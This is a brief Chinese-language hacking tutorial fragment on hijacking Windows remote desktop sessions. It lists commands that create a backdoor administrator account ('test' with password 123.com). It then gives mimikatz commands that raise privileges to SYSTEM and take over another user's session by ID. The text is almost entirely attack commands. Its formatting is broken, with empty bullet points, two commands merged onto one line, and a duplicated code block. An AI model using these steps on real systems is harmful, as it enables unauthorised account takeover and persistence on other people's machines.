**一、劫持方式1：**

创建用户：

net user test 123.com /add net localgroup administrators test /add

登录后，使用mimikatz工具

*   
*   
*   
*   
*

```
privilege::debug #提权 
ts::sessions #查看当前主机的会话
token::elevate #提升本地管理员权限为system 
ts::remote /id:1 #劫持id为1的会话
```

```
privilege::debug
```
